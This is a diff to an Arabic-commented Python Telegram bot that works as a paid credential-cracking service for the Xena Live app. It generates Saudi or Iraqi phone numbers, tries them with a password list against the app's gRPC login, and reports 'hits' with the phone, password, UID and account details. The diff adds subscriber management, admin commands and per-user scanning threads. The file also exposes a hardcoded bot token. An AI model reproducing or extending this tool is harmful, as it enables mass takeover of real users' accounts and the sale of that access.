@@ -5,13 +5,53 @@ import time
 import random
 import hashlib
 import threading
-from datetime import datetime
+import json
+from datetime import datetime, timedelta
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import grpc
 
 TOKEN = os.getenv("BOT_TOKEN", "8844579780:AAHI93U8a0StTBhwuCEbZJR7qzHpy2BdS3g")
 bot = telebot.TeleBot(TOKEN)
+
+# ضع آيدي الأدمن الخاص بك هنا (يمكنك إضافة أكثر من آيدي مفصولين بفواصل أو عبر المتغيرات البيئية)
+ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "8795120325").split(",") if x.strip().isdigit()]
+
+SUBS_FILE = "subscribers.json"
+
+# ══════════════════════════════════════════════════════════
+#  إدارة الاشتراكات وقاعدة البيانات المحلية
+# ══════════════════════════════════════════════════════════
+def load_subs():
+    if not os.path.exists(SUBS_FILE):
+        return {}
+    try:
+        with open(SUBS_FILE, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except:
+        return {}
+
+def save_subs(subs):
+    try:
+        with open(SUBS_FILE, "w", encoding="utf-8") as f:
+            json.dump(subs, f, ensure_ascii=False, indent=4)
+    except:
+        pass
+
+def is_active_subscriber(user_id):
+    if user_id in ADMIN_IDS:
+        return True
+    subs = load_subs()
+    str_id = str(user_id)
+    if str_id in subs:
+        expiry_str = subs[str_id]["expiry"]
+        expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
+        if datetime.now() < expiry_date:
+            return True
+        else:
+            # انتهى الاشتراكات
+            pass
+    return False
 
 # ══════════════════════════════════════════════════════════
 #  XOR obfuscation
@@ -225,64 +265,152 @@ def _gen_phone(cc):
     local = pref + ext
     return c["code"] + "-" + local, "0" + local
 
+# تخزين حالات وحلقات الفحص المستقلة لكل مستخدم على حدة (عدم دمج الفحص)
+user_scanners = {}
 user_states = {}
 
-checker_state = {
-    "is_running": False,
-    "checked": 0,
-    "hits": 0,
-    "errors": 0,
-    "start_time": 0
-}
-
-def get_main_keyboard(running=False):
+def get_main_keyboard(chat_id, running=False):
     markup = InlineKeyboardMarkup()
+    is_admin = chat_id in ADMIN_IDS
+    
     if not running:
         markup.add(
-            InlineKeyboardButton("🚀 بدء الفحص الجماعي (SA)", callback_data="start_sa"),
-            InlineKeyboardButton("🚀 بدء الفحص الجماعي (IQ)", callback_data="start_iq")
+            InlineKeyboardButton("فحص سعودية", callback_data="start_sa"),
+            InlineKeyboardButton("فحص عراقي", callback_data="start_iq")
         )
         markup.add(
-            InlineKeyboardButton("🔍 فحص حساب مفرد", callback_data="single_check_menu")
+            InlineKeyboardButton("فحص حساب مفرد", callback_data="single_check_menu")
         )
     else:
         markup.add(
-            InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_checker")
+            InlineKeyboardButton("ايقاف الفحص", callback_data="stop_checker")
         )
+        
+    if is_admin:
+        markup.add(InlineKeyboardButton("تحكم الادمن", callback_data="admin_panel"))
+        
     return markup
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    user_states.pop(message.chat.id, None)
-    markup = get_main_keyboard(checker_state["is_running"])
+    chat_id = message.chat.id
+    user_states.pop(chat_id, None)
+    
+    if not is_active_subscriber(chat_id):
+        bot.send_message(
+            chat_id,
+            "❌ **عذراً، لست مشتركاً مفَعلاً أو انتهت مدة اشتراكك.**\nيرجى التواصل مع إدارة البوت لتفعيل حسابك وإعطائك الصلاحية.",
+            parse_mode="Markdown"
+        )
+        return
+
+    is_running = user_scanners.get(chat_id, {}).get("is_running", False)
+    markup = get_main_keyboard(chat_id, is_running)
     bot.send_message(
-        message.chat.id, 
+        chat_id, 
         "🤖 **أهلاً بك في لوحة تحكم فاحص Xena Live**\n\nاختر العملية المطلوبة من الأزرار الشفافة بالأسفل:",
         reply_markup=markup,
         parse_mode="Markdown"
     )
 
+# ══════════════════════════════════════════════════════════
+#  أوامر الأدمن (تفعيل / حذف مشترك)
+# ══════════════════════════════════════════════════════════
+@bot.message_handler(commands=['add'])
+def cmd_add_sub(message):
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    parts = message.text.split()
+    if len(parts) < 3:
+        bot.reply_to(message, "⚠️ الاستخدام الصحيح:\n`/add <user_id> <days>`", parse_mode="Markdown")
+        return
+    
+    try:
+        target_id = str(parts[1])
+        days = int(parts[2])
+    except ValueError:
+        bot.reply_to(message, "❌ الآيدي أو الأيام يجب أن تكون أرقام صحيحة.")
+        return
+
+    subs = load_subs()
+    expiry_date = datetime.now() + timedelta(days=days)
+    subs[target_id] = {
+        "expiry": expiry_date.strftime("%Y-%m-%d %H:%M:%S")
+    }
+    save_subs(subs)
+    bot.reply_to(message, f"✅ تم تفعيل الاشتراك للمستخدم `{target_id}` لمدة `{days}` أيام بنجاح.\nينتهي في: `{subs[target_id]['expiry']}`", parse_mode="Markdown")
+
+@bot.message_handler(commands=['del'])
+def cmd_del_sub(message):
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    parts = message.text.split()
+    if len(parts) < 2:
+        bot.reply_to(message, "⚠️ الاستخدام الصحيح:\n`/del <user_id>`", parse_mode="Markdown")
+        return
+    
+    target_id = str(parts[1])
+    subs = load_subs()
+    if target_id in subs:
+        del subs[target_id]
+        save_subs(subs)
+        bot.reply_to(message, f"🗑 تم حذف اشتراك المستخدم `{target_id}` بنجاح.", parse_mode="Markdown")
+    else:
+        bot.reply_to(message, "❌ هذا المستخدم غير موجود في قائمة المشتركين.")
+
+@bot.message_handler(commands=['subs'])
+def cmd_list_subs(message):
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    subs = load_subs()
+    if not subs:
+        bot.reply_to(message, "ℹ️ لا يوجد مشتركين حالياً.")
+        return
+    
+    text = "📋 **قائمة المشتركين المفعلين:**\n\n"
+    for uid, data in subs.items():
+        text += f"• آيدي: `{uid}`\n  ينتهي في: `{data['expiry']}`\n\n"
+    bot.reply_to(message, text, parse_mode="Markdown")
+
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
-    global checker_state
-    data = call.data
     chat_id = call.message.chat.id
+    data = call.data
 
-    if data == "single_check_menu":
+    if not is_active_subscriber(chat_id):
+        bot.answer_callback_query(call.id, "❌ انتهت صلاحية اشتراكك!", show_alert=True)
+        return
+
+    if data == "admin_panel":
+        if chat_id not in ADMIN_IDS:
+            bot.answer_callback_query(call.id, "❌ أمر مخصص للأدمن فقط!")
+            return
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=call.message.message_id,
+            text="⚙️ **لوحة تحكم الأدمن:**\n\nلإدارة المشتركين استخدم الأوامر التالية في الدردشة:\n• لتفعيل مشترك: `/add <user_id> <الأيام>`\n• لحذف مشترك: `/del <user_id>`\n• لعرض المشتركين: `/subs`",
+            reply_markup=markup,
+            parse_mode="Markdown"
+        )
+
+    elif data == "single_check_menu":
         user_states[chat_id] = "waiting_for_single_account"
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
         bot.edit_message_text(
             chat_id=chat_id,
             message_id=call.message.message_id,
-            text="🔍 **وضع فحص حساب مفرد**\n\nأرسل الآن الحساب بالصيغة التالية:\n`رقم_الهاتف:كلمة_المرور`\n\n*(مثال: `966501234567:Aa123456@`)*\nسيتم التعرف على الدولة تلقائياً وفحص الحساب وعرض النتائج الكاملة.",
+            text="🔍 **وضع فحص حساب مفرد**\n\nأرسل الآن الحساب بالصيغة التالية:\n`رقم_الهاتف:كلمة_المرور`\n\n*(مثال: `966501234567:Aa123456@`)*",
             reply_markup=markup,
             parse_mode="Markdown"
         )
 
     elif data == "back_to_main":
         user_states.pop(chat_id, None)
-        markup = get_main_keyboard(checker_state["is_running"])
+        is_running = user_scanners.get(chat_id, {}).get("is_running", False)
+        markup = get_main_keyboard(chat_id, is_running)
         bot.edit_message_text(
             chat_id=chat_id,
             message_id=call.message.message_id,
@@ -292,33 +420,38 @@ def callback_query(call):
         )
 
     elif data.startswith("start_"):
-        if checker_state["is_running"]:
-            bot.answer_callback_query(call.id, "⚠️ الفحص يعمل بالفعل!")
+        if user_scanners.get(chat_id, {}).get("is_running", False):
+            bot.answer_callback_query(call.id, "⚠️ لديك فحص يعمل بالفعل!")
             return
         
         cc = data.split("_")[1].upper()
-        checker_state["is_running"] = True
-        checker_state["checked"] = 0
-        checker_state["hits"] = 0
-        checker_state["errors"] = 0
-        checker_state["start_time"] = time.time()
+        
+        # إنشاء نافذة وحالة خاصة مستقلة تماماً لهذا المستخدم فقط
+        user_scanners[chat_id] = {
+            "is_running": True,
+            "checked": 0,
+            "hits": 0,
+            "errors": 0,
+            "start_time": time.time(),
+            "cc": cc
+        }
 
-        bot.answer_callback_query(call.id, f"🚀 بدأ الفحص لدولة {cc}")
-        threading.Thread(target=run_background_scanner, args=(chat_id, call.message.message_id, cc), daemon=True).start()
+        bot.answer_callback_query(call.id, f"🚀 بدأ فحصك الخاص لدولة {cc}")
+        threading.Thread(target=run_user_scanner, args=(chat_id, call.message.message_id, cc), daemon=True).start()
 
     elif data == "stop_checker":
-        if not checker_state["is_running"]:
-            bot.answer_callback_query(call.id, "⚠️ الفحص متوقف أساساً.")
+        if not user_scanners.get(chat_id, {}).get("is_running", False):
+            bot.answer_callback_query(call.id, "⚠️ فحصك متوقف أساساً.")
             return
         
-        checker_state["is_running"] = False
-        bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص.")
+        user_scanners[chat_id]["is_running"] = False
+        bot.answer_callback_query(call.id, "⏹ تم إيقاف فحصك بنجاح.")
         try:
             bot.edit_message_text(
                 chat_id=chat_id,
                 message_id=call.message.message_id,
-                text="⏹ **تم إيقاف عملية الفحص بنجاح.**",
-                reply_markup=get_main_keyboard(False),
+                text="⏹ **تم إيقاف عملية الفحص الخاصة بك بنجاح.**",
+                reply_markup=get_main_keyboard(chat_id, False),
                 parse_mode="Markdown"
             )
         except:
@@ -327,6 +460,9 @@ def callback_query(call):
 @bot.message_handler(func=lambda message: True)
 def handle_text_messages(message):
     chat_id = message.chat.id
+    if not is_active_subscriber(chat_id):
+        return
+
     if user_states.get(chat_id) == "waiting_for_single_account":
         text = message.text.strip()
         if ":" not in text:
@@ -403,29 +539,32 @@ def handle_text_messages(message):
 
         threading.Thread(target=process_single, daemon=True).start()
 
-def run_background_scanner(chat_id, message_id, cc):
-    global checker_state
+# حلقة فحص مستقلة خاصة بكل مستخدم (تمنع التداخل نهائياً)
+def run_user_scanner(chat_id, message_id, cc):
     cli = GrpcClient()
     last_update_time = 0
 
-    while checker_state["is_running"]:
+    while user_scanners.get(chat_id, {}).get("is_running", False):
         try:
             phone, first_pw = _gen_phone(cc)
             for pw in [first_pw] + PASSWORDS:
-                if not checker_state["is_running"]: break
+                if not user_scanners.get(chat_id, {}).get("is_running", False): 
+                    break
                 
                 payload = _build_login(phone, pw, cc)
                 data, err = cli.call(cli._login, payload)
-                checker_state["checked"] += 1
+                
+                state = user_scanners[chat_id]
+                state["checked"] += 1
 
                 if err:
-                    checker_state["errors"] += 1
+                    state["errors"] += 1
                 elif data:
                     res = _parse_login(data)
                     if res.get("status") == "hit":
-                        checker_state["hits"] += 1
+                        state["hits"] += 1
                         acct = _fetch_info(cli, res.get("shortUID", 0), res.get("token", ""))
-                        hit_msg = (f"🎯 **HIT FOUND!**\n\n"
+                        hit_msg = (f"🎯 **HIT FOUND! [خاص بك]**\n\n"
                                    f"📱 Phone: `{phone}`\n"
                                    f"🔑 Pass: `{pw}`\n"
                                    f"🆔 UID: `{res.get('uid')}`\n"
@@ -438,15 +577,15 @@ def run_background_scanner(chat_id, message_id, cc):
                 current_time = time.time()
                 if current_time - last_update_time >= 2.0:
                     last_update_time = current_time
-                    elapsed = int(current_time - checker_state["start_time"])
-                    speed = checker_state["checked"] / max(elapsed, 1)
+                    elapsed = int(current_time - state["start_time"])
+                    speed = state["checked"] / max(elapsed, 1)
                     
                     status_text = (
-                        f"🚀 **جاري فحص دولة [{cc}] بثبات...**\n\n"
-                        f"📊 **الإحصائيات المباشرة:**\n"
-                        f"• تم فحص: `{checker_state['checked']}` رقم\n"
-                        f"• الصيد الصحيح (Hits): `{checker_state['hits']}` 🎯\n"
-                        f"• الأخطاء: `{checker_state['errors']}` ⚠️\n"
+                        f"🚀 **جاري فحص دولة [{cc}] في نافذتك الخاصة...**\n\n"
+                        f"📊 **إحصائياتك المباشرة:**\n"
+                        f"• تم فحص: `{state['checked']}` رقم\n"
+                        f"• الصيد الصحيح (Hits): `{state['hits']}` 🎯\n"
+                        f"• الأخطاء: `{state['errors']}` ⚠️\n"
                         f"• السرعة: `{speed:.1f} فحص/ثانية` ⚡\n"
                         f"• الوقت المنقضي: `{elapsed} ثانية` ⏱"
                     )
@@ -455,7 +594,7 @@ def run_background_scanner(chat_id, message_id, cc):
                             chat_id=chat_id,
                             message_id=message_id,
                             text=status_text,
-                            reply_markup=get_main_keyboard(True),
+                            reply_markup=get_main_keyboard(chat_id, True),
                             parse_mode="Markdown"
                         )
                     except:
@@ -465,16 +604,17 @@ def run_background_scanner(chat_id, message_id, cc):
 
     cli.close()
     try:
+        final_state = user_scanners.get(chat_id, {"checked": 0, "hits": 0})
         bot.edit_message_text(
             chat_id=chat_id,
             message_id=message_id,
-            text=f"⏹ **توقف الفحص نهائياً.**\nالنتائج النهائية:\n• إجمالي الفحص: `{checker_state['checked']}`\n• الصيد: `{checker_state['hits']}`",
-            reply_markup=get_main_keyboard(False),
+            text=f"⏹ **توقف فحصك الخاص نهائياً.**\nنتائجك النهائية:\n• إجمالي الفحص: `{final_state.get('checked', 0)}`\n• الصيد: `{final_state.get('hits', 0)}`",
+            reply_markup=get_main_keyboard(chat_id, False),
             parse_mode="Markdown"
         )
     except:
         pass
 
 if __name__ == "__main__":
-    print("Bot is running completely updated...")
+    print("Bot is running with Admin system and isolated user sessions...")
     bot.infinity_polling()
